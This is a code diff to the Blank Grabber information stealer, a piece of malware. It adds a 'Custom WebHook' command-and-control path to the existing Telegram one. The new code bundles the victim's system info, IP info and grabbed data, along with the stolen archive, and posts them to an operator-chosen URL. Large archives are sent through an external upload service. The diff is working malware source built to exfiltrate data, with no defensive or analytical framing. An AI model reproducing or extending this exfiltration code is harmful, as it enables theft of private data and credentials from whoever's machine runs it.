@@ -1653,6 +1653,49 @@ class BlankGrabber:
             fields.update({'chat_id': chat_id})
             http.request('POST', 'https://api.telegram.org/bot%s/sendDocument' % token, fields=fields)
 
+            
+        elif Settings.C2[0] == 2: # Custom WebHook Bot
+            image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
+
+            payload = {
+                "content": "||@everyone||" if Settings.PingMe else "",
+                "embeds": [
+                    {
+                        "title": "Blank Grabber",
+                        "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
+                        "url": "https://github.com/Blank-c/Blank-Grabber",
+                        "color": 34303,
+                        "footer": {
+                            "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
+                        },
+                        "thumbnail": {
+                            "url": image_url
+                        }
+                    }
+                ],
+                "username" : "Blank Grabber",
+                "avatar_url" : image_url
+            }
+
+            if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20: # 20 MB
+                url = self.UploadToExternalService(self.ArchivePath, filename)
+                if url is None:
+                    raise Exception("Failed to upload to external service")
+            else:
+                url = None
+            
+            fields = dict()
+
+            if url:
+                payload["content"] += " | Archive : %s" % url
+            else:
+                fields["file"] = (filename, open(self.ArchivePath, "rb").read())
+            
+            fields["payload_json"] = json.dumps(payload).encode()
+
+            http.request("POST", Settings.C2[1], fields=fields)
+        
+
 if __name__ == "__main__" and os.name == "nt":
     Logger.info("Process started")
     if Settings.HideConsole:
